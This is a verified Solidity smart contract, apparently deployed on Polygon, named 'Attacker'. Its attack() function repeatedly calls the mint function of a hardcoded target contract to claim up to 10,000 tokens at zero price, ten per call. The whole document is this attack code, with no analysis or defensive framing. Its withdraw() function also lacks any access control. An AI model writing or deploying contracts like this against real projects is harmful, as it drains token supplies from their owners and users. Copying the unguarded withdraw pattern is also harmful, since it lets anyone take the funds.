/**
 *Submitted for verification at polygonscan.com on 2023-04-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

contract Attacker {
    address public contractAddr = 0x7D2b9b2aA86B6749D14155aAe4c3a5E7ecD72C5f;
    address public victim = 0x1110AEB170972F2Ef743e3c118D03A013A105Bb5;
    uint256 public totalMint = 10000;
    uint256 public maxMintPerTx = 10;
    uint256 public price = 0;

    function attack() external payable {
        require(msg.sender == victim, "You are not authorized to perform this action.");
        for (uint256 i = 1; i <= totalMint; i += maxMintPerTx) {
            (bool success, ) = contractAddr.call{value: price * maxMintPerTx}(
                abi.encodeWithSignature("mint(uint256)", maxMintPerTx)
            );
            require(success, "Failed to call mint function.");
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}